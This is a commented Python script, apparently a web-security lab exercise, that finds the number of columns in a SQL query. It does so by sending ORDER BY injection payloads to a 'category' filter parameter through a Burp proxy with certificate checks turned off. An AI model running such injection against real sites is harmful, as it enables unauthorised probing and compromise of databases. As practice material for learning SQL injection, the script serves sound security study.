# Import necessary libraries
import requests  # For making HTTP requests
import sys  # For handling command-line arguments
import urllib3  # For disabling SSL/TLS warnings

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to determine the number of columns in a SQL injection vulnerability
def exploit_sqli_column_number(url):
    # Define the path to the vulnerable parameter
    path = "/filter?category=Gifts"
    
    # Loop through column numbers to perform SQL injection attack
    for i in range(1, 50):
        # Generate SQL payload for ordering by the current column number
        sql_payload = "'+order+by+%s--" % i
        # Send a GET request with the SQL payload
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        # Check if the response contains "Internal Server Error," indicating an invalid column
        if "Internal Server Error" in res:
            return i - 1  # Return the actual column count (subtract 1 because of 0-indexing)
    return False  # SQL injection attack not successful, return False

# Main program execution block
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get target URL from command-line arguments
    except IndexError:
        # Print usage instructions and exit if the argument is missing
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    # Step 1: Determine the number of columns using SQL injection
    print("[+] Figuring out the number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
    else:
        print("[-] The SQLi attack was not successful.")